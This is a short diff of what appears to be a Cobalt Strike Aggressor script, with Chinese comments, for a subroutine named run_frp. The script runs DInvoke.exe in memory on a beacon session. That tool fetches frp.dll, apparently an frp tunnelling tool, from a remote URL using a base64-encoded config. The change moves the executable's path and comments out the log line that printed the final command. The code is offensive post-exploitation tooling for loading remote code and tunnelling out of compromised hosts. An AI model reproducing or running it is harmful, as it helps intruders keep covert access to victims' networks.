@@ -28,11 +28,11 @@ sub run_frp {
     $base64Config = base64_encode($config);
 
     # 准备要执行的程序路径和参数
-    $exe = script_resource("/scripts/IntrAgent/x64/DInvoke.exe");
+    $exe = script_resource("/scripts/DInvoke.exe");
     $param = "--url " . $url . "/IntrAgent/x64/frp.dll --config " . $base64Config;
 
     # 打印最终的执行命令
-    blog2($bid, "最终执行的命令: $exe $param");
+    #blog2($bid, "最终执行的命令: $exe $param");
 
     # 执行程序
     bexecute_assembly!($bid, $exe, $param);
